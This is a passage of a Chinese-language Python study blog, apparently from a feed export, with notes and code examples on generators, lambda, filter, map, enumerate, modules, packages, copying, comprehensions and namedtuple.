class="hljs-built_in">print</span>(g) <span class="hljs-comment"># 会显示g是一个迭代器对象&lt;generator object my_range at 0x7f0ed8a31310&gt;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(g)) <span class="hljs-comment"># 1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(g)) <span class="hljs-comment"># 2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(g)) <span class="hljs-comment"># 3</span><br></code></pre></td></tr></table></figure><ul><li>生成器函数的使用yiled语句实现的，python的yield表达式也很强大。yield不仅可以从函数体内往外取值，还可以从外部往函数体内传值，传值使用<code>generator.send(value)</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">eater</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Ready to eat&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        food = <span class="hljs-keyword">yield</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;get the food: %s, and start to eat&#x27;</span> %food)<br><br><br>g = eater()<br><span class="hljs-built_in">next</span>(g)<span class="hljs-comment"># 传值前必须先调用一次生成器，让生成器先挂起来，等待接收yield赋值给food</span><br>g.send(<span class="hljs-string">&#x27;包子&#x27;</span>)   <span class="hljs-comment"># 通过send方法将数据传给yield赋值给food,生成器内部有循环又会再次被挂起</span><br>g.send(<span class="hljs-string">&#x27;牛奶&#x27;</span>)   <span class="hljs-comment"># send（）必须要有一个实参</span><br>g.send(<span class="hljs-literal">None</span>)<span class="hljs-comment"># 如果send的是None，则默认执行next(g)</span><br></code></pre></td></tr></table></figure><h2 id="3-8-匿名函数"><a href="#3-8-匿名函数" class="headerlink" title="3.8 匿名函数"></a>3.8 匿名函数</h2><ul><li>匿名函数lambda 就是不命名的函数，一般用于一次性使用的场景，不属于任何类</li><li>定义有名字的函数用def 定义没名字的函数用lambda</li><li>fun &#x3D; lambda 入参 : 返回结果 lambda arguments: expression</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">return</span> x+y<br>fun2=<span class="hljs-keyword">lambda</span> x,y:x+y <span class="hljs-comment"># 冒号前面写入参，后面写返回结果</span><br><span class="hljs-comment"># 示例二</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sq</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> x*x<br><span class="hljs-built_in">map</span>(sq,[y <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]) <span class="hljs-comment"># map组合，前面是方法，后面是传参</span><br><span class="hljs-comment"># 使用lambda</span><br><span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x:x*x , [y <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]) <span class="hljs-comment"># 配合内置函数用，效果极佳，简洁有效</span><br></code></pre></td></tr></table></figure><h2 id="3-9-内置函数之filter-其实是一个类"><a href="#3-9-内置函数之filter-其实是一个类" class="headerlink" title="3.9 内置函数之filter (其实是一个类)"></a>3.9 内置函数之filter (其实是一个类)</h2><ul><li>filter是一个类，不是一个函数，查看源码发现</li><li>fulter的入参是两个：function_or_None和iterable可迭代对象 </li><li>如果function是None的话，就报错</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> x%<span class="hljs-number">2</span>==<span class="hljs-number">0</span><br>list1 = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">12</span>,<span class="hljs-number">142</span>,<span class="hljs-number">352</span>,<span class="hljs-number">4235</span>,<span class="hljs-number">56</span>,<span class="hljs-number">57</span>,<span class="hljs-number">86</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>]<br>a = <span class="hljs-built_in">filter</span>(fun,list1)<span class="hljs-comment"># 这里获得的是filter对象，要转化成对应的列表</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(a)) <span class="hljs-comment"># [2, 4, 6, 8, 10, 12, 142, 352, 56, 86, 12]</span><br><span class="hljs-comment"># 用lambda 实现 定义匿名方法</span><br>a = <span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x:x%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>,list1)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(a))  <span class="hljs-comment"># [2, 4, 6, 8, 10, 12, 142, 352, 56, 86, 12]</span><br><br></code></pre></td></tr></table></figure><h3 id="3-9-2-内置函数之map"><a href="#3-9-2-内置函数之map" class="headerlink" title="3-9.2 内置函数之map"></a>3-9.2 内置函数之map</h3><p><code>map()</code> 是 Python 的内置函数之一，它用于将一个函数应用于一个或多个可迭代对象（如列表、元组等）的每个元素，并返回一个包含结果的新的迭代器。</p><p><code>map()</code> 函数的工作原理是遍历 <code>iterable</code> 中的每个元素，并将每个元素传递给 <code>function</code> 进行处理。<code>function</code> 将对每个元素执行指定的操作，并返回结果。最后，<code>map()</code> 返回一个新的迭代器，其中包含了经过 <code>function</code> 处理后的每个元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将列表中的每个元素平方</span><br>numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>squared_numbers = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x ** <span class="hljs-number">2</span>, numbers)<br><br><span class="hljs-comment"># 打印结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(squared_numbers))  <span class="hljs-comment"># 输出: [1, 4, 9, 16, 25]</span><br></code></pre></td></tr></table></figure><h2 id="3-10-内置函数值enumerate"><a href="#3-10-内置函数值enumerate" class="headerlink" title="3.10 内置函数值enumerate"></a>3.10 内置函数值enumerate</h2><ul><li>enumerate看源码，入参是一个可迭代对象，和一个默认为0的start起始值，</li><li>返回：以元组形式返回enumerate对象，元组内是（下标索引，值）的形式，</li><li>可以通过给start传参定义起始位置的索引值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">name=[<span class="hljs-string">&#x27;asd&#x27;</span>,<span class="hljs-string">&#x27;asda&#x27;</span>,<span class="hljs-string">&#x27;qweq&#x27;</span>,<span class="hljs-string">&#x27;fgdb&#x27;</span>]<br><span class="hljs-keyword">for</span> index value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(name,start=<span class="hljs-number">0</span>): <span class="hljs-comment"># 默认下标起始值是0</span><br>    <span class="hljs-built_in">print</span>(index,value) <span class="hljs-comment"># (0,&#x27;asd&#x27;),(1,&#x27;asda&#x27;),(2,&#x27;qweq&#x27;),(3,&#x27;fgdb&#x27;),</span><br></code></pre></td></tr></table></figure><h2 id="3-11-模块的本质"><a href="#3-11-模块的本质" class="headerlink" title="3.11 模块的本质"></a>3.11 模块的本质</h2><ul><li>一个python文件就是一个模块，</li><li>模块是一堆功能的集合，算是一种代码“封装”的方式</li><li>内置模块，第三方模块，自定义模块。其实就是各种文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python三类模块：</span><br><span class="hljs-comment"># 内置模块：python解释器自带的模块，直接使用</span><br><span class="hljs-comment"># 第三方模块：python社区伙伴们开源提供的python模块，需要下载后使用</span><br><span class="hljs-comment"># 自定义模块：自定义模块指的是我们自己编写的脚本文件，文件名就是模块名，如 get_sum.py，get_sum就是模块名</span><br></code></pre></td></tr></table></figure><ul><li>模块先导入后使用。导入模块的方式：<code>import、from、或两者配合使用</code>-</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 导入模块的方式</span><br>- 方式<span class="hljs-number">1</span>：<span class="hljs-keyword">import</span> module_name<br>- 方式<span class="hljs-number">2</span>：<span class="hljs-keyword">from</span> modele_name <span class="hljs-keyword">import</span> model_content1, modele_content2, ...<br>- 方式<span class="hljs-number">3</span>：<span class="hljs-keyword">from</span> model_name <span class="hljs-keyword">import</span> *<br>- 方式<span class="hljs-number">4</span>：<span class="hljs-keyword">import</span> modele_name <span class="hljs-keyword">as</span> nickname<br><br><span class="hljs-comment"># 导入位置</span><br>- 文件头：文件开头导入的模块属于全局作用域<br>- 函数内：函数内导入的模块属于局部的作用域<br></code></pre></td></tr></table></figure><ul><li>导入模块的本质</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1、产生一个新的名称空间（名字是被导入模块名）；</span><br><span class="hljs-comment"># 2、执行被导入模块源文件代码，将产生的名字存放在新的名称空间中；</span><br><span class="hljs-comment"># 3、将模块名称空间的名字添加到当前执行文件所的名称空间中</span><br><br><span class="hljs-comment"># 补充：</span><br>- 导入方式：<span class="hljs-keyword">import</span> ..，在当前执行文件的名称空间中放一个被导入模块的名字，通过这个名字引用模块中的名字。<br>-导入方式：<span class="hljs-keyword">from</span> .. <span class="hljs-keyword">import</span>..，在当前执行文件的名称空间中直接放一个模块中的名字，不能访问模块的其他名字。 <br></code></pre></td></tr></table></figure><ul><li>模块的本质可以理解为是一个命名空间（Namespace）</li><li>命名空间相互隔离的，这个命名了的空间下面的东西，就只属于这个命名空间</li><li>import 导入，就是导入了一个命名空间，就是导入了一个py文件</li></ul><h2 id="3-12-py文件的两种用途"><a href="#3-12-py文件的两种用途" class="headerlink" title="3.12 py文件的两种用途"></a>3.12 py文件的两种用途</h2><ul><li>1、当脚本被执行</li><li>2、当模块被导入使用</li><li>区别：<ul><li>脚本文件执行的时候，产品的命名空间会在程序解释后失效回收</li><li>模块导入运行的试试，产生的命名空间会在引用计数为零的时候回收释放。</li></ul></li><li>每一个py文件都有一个属性：<code>__name___</code>    这个不是他的命名空间 </li><li>当py文件被当做模块导入的时候，<code>__name__</code> &#x3D;&#x3D;”模块名”</li><li>所以<code>if __name__=“__main__”</code>时，就意味着该模块是主程序入口</li></ul><h2 id="3-13-包的本质"><a href="#3-13-包的本质" class="headerlink" title="3.13 包的本质"></a>3.13 包的本质</h2><ul><li>包： 就是一堆模块的集合，那单个模块是单个py文件，那包就是好多文件的集合，就是文件夹，且包含一个<code>.__init__</code>文件</li><li>导入包，起始就是导入包内init文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 包是一个包含__init__.py文件的文件夹。package</span><br><span class="hljs-comment"># 对于普通模块（一个py文件），会发生三件事，其中一件事就是执行模块文件的代码。</span><br><span class="hljs-comment"># 包是一个文件夹，不能是普通模块那样被执行代码，所以给包提供了一个__init__.py文件，导入包就会执行__init__.py文件，这也是__init__.py文件村的意义。</span><br><span class="hljs-comment"># python3中，文件夹没有__init__.py也可以，但是在python2中包必须要有该文件。</span><br>- tools<br>__init__.py<br>    calculate.py<br>- main.py<br></code></pre></td></tr></table></figure><ul><li>导入包就是导入包内的<code>__init__.py</code>文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1 包的导入方式和模块的一样：import 和 from...import..两种</span><br>- 无论何种方式，无论任何位置，导入时带点的，点的左边都必须是一个包。<br><span class="hljs-comment">#2 包A和包B下有同名模块也不会冲突，如A.a与B.a来自俩个命名空间</span><br><span class="hljs-comment">#3 import导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的__init__.py，导入包本质就是在导入该文件</span><br></code></pre></td></tr></table></figure><ul><li>不管是import包名.模块名 还是from 包名 import模块名，带点的时候，点的前面都是包名</li></ul>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】进阶之数据结构（二）</title>
    <link href="/2024/03/18/602python%E8%BF%9B%E9%98%B6%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/03/18/602python%E8%BF%9B%E9%98%B6%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="2-数据结构"><a href="#2-数据结构" class="headerlink" title="2 数据结构"></a>2 数据结构</h1><h2 id="2-1基本数据结构"><a href="#2-1基本数据结构" class="headerlink" title="2.1基本数据结构"></a>2.1基本数据结构</h2><p>可变：列表、字典、集合</p><p>不可变：数字、浮点、字符串、元组（需元组内无可变）</p><p>直接访问：数字</p><p>顺序访问（序列类型）：字符串、列表、元组</p><p>Key值访问（映射关系）：字典 </p><h2 id="2-2-深浅拷贝"><a href="#2-2-深浅拷贝" class="headerlink" title="2.2 深浅拷贝"></a>2.2 深浅拷贝</h2><p>【什么是拷贝】：原封不动地复制一份新的，在不同的内存地址上，修改旧的不会影响新的。</p><p>变量赋值不是拷贝</p><p><img src="/../img/python/image-20220419175739670.png" alt="image-20220419175739670.png"></p><ul><li><p>变量赋值不是拷贝操作，因为变量名<code>list1</code>和变量名<code>list2</code>指向的是一块相同的内存地址</p></li><li><p>赋值操作后，无论是通过<code>list1</code>还是<code>list2</code>修改列表的元素，都会影响对方。</p></li><li><p>浅拷贝修改原始数据会影响对方</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">list1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, [<span class="hljs-number">11</span>, <span class="hljs-number">22</span>]]<br>list2 = list1.copy()<span class="hljs-comment"># 使用列表的copy方法或使用copy模块中的copy方法，都是浅拷贝</span><br><br><span class="hljs-comment"># 浅拷贝后：id(list1) 不等于 id(list2)，说明拷贝了一个新列表。</span><br></code></pre></td></tr></table></figure><p><img src="/../img/python/image-20220419180226331.png" alt="image-20220419180226331"></p><ul><li>执行浅拷贝操作，将在开辟一块新的内存空间，然后将<code>list2</code>绑定到这块内存空间上。</li><li>新内存空间中有三个位置用来存放其三个元素的内存地址。</li><li>新拷贝的列表的三个位置分别绑定旧列表三个位置上的元素的内存地址。</li><li>所以修改旧列表的中的字列表时，会影响新列表中的值，因为它们还同步一部分内存空间。</li></ul><p>【深拷贝】：使用copy.deepcopy()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<span class="hljs-comment"># 导入内置copy模块</span><br>list1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, [<span class="hljs-number">11</span>, <span class="hljs-number">22</span>]]<br>list2 = copy.deepcopy(list1)<span class="hljs-comment"># 调用deepcopy()实现深拷贝</span><br></code></pre></td></tr></table></figure><p><img src="/./img/python/image-20220419180757393.png" alt="image-20220419180757393"></p><ul><li>深拷贝时，当元素是可变数据类型时，会重新开辟一块内存空间，存放这个元素对象的内存地址，且该元素内部的可变数据类型也会再重新开辟内存空间，层层检测，层层拷贝。</li><li>此时，新旧列表的子元素都不会共享内存地址，所有不会相互影响。</li></ul><p>深拷贝不会，互相独立的</p><p>【总结】</p><ul><li>深浅拷贝讨论的拷贝对象是可变数据类型</li><li>深浅拷贝的区别在于：是否区分元素的可变还是不可变类型的判断;</li><li>列表的切片也是浅拷贝，copy模块的<code>copy.copy()</code>函数是浅拷贝操作，和列表的内置方法<code>copy()</code>功能相同。</li><li>容器型数据类型的拷贝都存在深浅拷贝问题。</li><li>深浅拷贝没有有优缺点。</li></ul><h2 id="2-3-推导式"><a href="#2-3-推导式" class="headerlink" title="2.3 推导式"></a>2.3 推导式</h2><p>【推导式】也成生成式（comprehensions）是 Python 独有的一种高级特性，它可以使用简单的一行代码实现列表、字典等数据类型的创建或数据类型的转换等任务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 普通写法：</span><br>nums = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">101</span>):<br>    nums.append(i*i)<br><br><span class="hljs-comment"># 推导式写法：</span><br>nums = [i*i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">101</span>)]<br></code></pre></td></tr></table></figure><p>【列表推导式】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 【列表推导式】</span><br><span class="hljs-comment"># 方式1</span><br>nums = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># 方式2</span><br>a = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">18</span>&#125;<br>keys = [key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> a]<br></code></pre></td></tr></table></figure><p>【字段推导式】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 方式1</span><br>nums = &#123;i: i*<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)&#125;<br><br><span class="hljs-comment"># 方式2</span><br>li = [[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>], (<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)]<br><span class="hljs-built_in">dict</span>(x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> li)<span class="hljs-comment"># &#123;1: 2, 3: 4&#125;</span><br></code></pre></td></tr></table></figure><p>【集合推导式】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 方式1</span><br>b = &#123;i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)&#125;<br><br><span class="hljs-comment"># 方式2</span><br>a = <span class="hljs-built_in">set</span>(i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>))<br></code></pre></td></tr></table></figure><p>【元组推导式】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 方式1</span><br><span class="hljs-built_in">tuple</span>(x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>))<span class="hljs-comment"># (1, 2, 3, 4)</span><br><br><span class="hljs-comment"># 数据类型转换</span><br>nums = [<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]<br><span class="hljs-built_in">tuple</span>(x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> nums)<span class="hljs-comment"># (3, 4, 5, 6)</span><br><br><span class="hljs-comment"># 元组推导式，按理说应该使用()定义，括号内循环的方式生成元组生成式，</span><br><span class="hljs-comment"># 但是()被python中的生成器占用，所以只能使用tuple</span><br></code></pre></td></tr></table></figure><p>list_a &#x3D; [m for i in iterable for m in i ]</p><h3 id="2-4-1-三元表达式"><a href="#2-4-1-三元表达式" class="headerlink" title="2.4.1 三元表达式"></a>2.4.1 三元表达式</h3><p>在Python中，三元表达式是一种简洁的条件表达式，用于根据条件选择不同的值。它的语法形式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">value_if_true <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> value_if_false<br></code></pre></td></tr></table></figure><p>其中，<code>condition</code> 是一个条件表达式，如果条件为真，则返回 <code>value_if_true</code>；否则返回 <code>value_if_false</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">10</span><br>y = <span class="hljs-number">20</span><br><br>max_value = x <span class="hljs-keyword">if</span> x &gt; y <span class="hljs-keyword">else</span> y<br><span class="hljs-built_in">print</span>(max_value)  <span class="hljs-comment"># 输出 20</span><br></code></pre></td></tr></table></figure><p>三元表达式通常用于简单的条件选择，可以在一行代码中快速进行条件判断和值的选择。它比使用完整的 <code>if-else</code> 语句更为简洁和紧凑。</p><h2 id="2-4-namedtuple-有名元组【重点】"><a href="#2-4-namedtuple-有名元组【重点】" class="headerlink" title="2.4 namedtuple 有名元组【重点】"></a>2.4 namedtuple 有名元组【重点】</h2><p>可以想象成一个元组但是他有名字，也叫具名元组</p><p>兼顾元组的特性，一旦定义不能被修改</p><p>可以通过对象点的方式访问，。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> namedtuple<br><br>Point = namedtuple(<span class="hljs-string">&quot;Point&quot;</span>, [<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>])<span class="hljs-comment"># 新建一个Point类型，具有x y两个字段</span><br>p = Point(<span class="hljs-number">11</span>, y=<span class="hljs-number">22</span>)<span class="hljs-comment"># 实例化p  11赋值给x, 22赋值给y</span><br><br><span class="hljs-built_in">print</span>(p[<span class="hljs-number">0</span>], p[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(p.x, p.y)<span class="hljs-comment"># 属性取值</span><br><span class="hljs-built_in">print</span>(p._asdict())<span class="hljs-comment"># 返回一个字典：&#123;&quot;x&quot;: 11, &quot;y&quot;: 22&#125;</span><br><br>d = &#123;<span class="hljs-string">&quot;x&quot;</span>: <span class="hljs-number">11</span>, <span class="hljs-string">&quot;y&quot;</span>: <span class="hljs-number">22</span>&#125;<br><span class="hljs-built_in">print</span>(Point(**d))<span class="hljs-comment"># 通过字典新建 这个好用</span><br><br>p._replace(x=<span class="hljs-number">100</span>)<span class="hljs-comment"># 返回一个新namedtuple</span><br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> namedtuple<br><br><span class="hljs-comment"># 定义有名元组的类</span><br>Person = namedtuple(<span class="hljs-string">&#x27;Person&#x27;</span>, [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-string">&#x27;city&#x27;</span>])<br><br><span class="hljs-comment"># 原始字典</span><br>person_dict = &#123;<br>    <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>    <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">25</span>,<br>    <span class="hljs-string">&#x27;city&#x27;</span>: <span class="hljs-string">&#x27;New York&#x27;</span><br>&#125;<br><br><span class="hljs-comment"># 将字典转换为有名元组</span><br>person_tuple = Person(**person_dict)<br><br><span class="hljs-built_in">print</span>(person_tuple.name)  <span class="hljs-comment"># 输出 &#x27;Alice&#x27;</span><br><span class="hljs-built_in">print</span>(person_tuple.age)   <span class="hljs-comment"># 输出 25</span><br><span class="hljs-built_in">print</span>(person_tuple.city)  <span class="hljs-comment"># 输出 &#x27;New York&#x27;</span><br></code></pre></td></tr></table></figure><p>首先通过 <code>namedtuple</code> 函数定义了一个名为 <code>Person</code> 的有名元组类，它有三个字段：<code>name</code>、<code>age</code> 和 <code>city</code>。然后，定义了一个字典 <code>person_dict</code>，包含了相应的字段值。接下来，使用 <code>**</code> 运算符将字典中的键值对作为参数传递给 <code>Person</code> 类的构造函数，创建了一个有名元组对象 <code>person_tuple</code>。</p><p>优点：通过访问有名元组对象的字段，可以获取字典中对应的值。</p><p>缺点：</p><p>1、不可变性（定义了就不能变）</p><p>2、额外的内存消耗：需要开辟额外的内存空间来存储字段名称和值，大规模数据时可能会影响性能</p><p>3、有限的功能：轻量级，缺乏灵活性，</p><p>4、不支持动态字段操作：不可以动态添加和删除</p><h2 id="2-5-OrderedDict-顺序字典"><a href="#2-5-OrderedDict-顺序字典" class="headerlink" title="2.5 OrderedDict 顺序字典"></a>2.5 OrderedDict 顺序字典</h2><p>python3.6之前的字典是不按插入先后顺序排序的，但是可以实现这种功能，就是OrderedDict类型字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderedDict</span>(<span class="hljs-title class_ 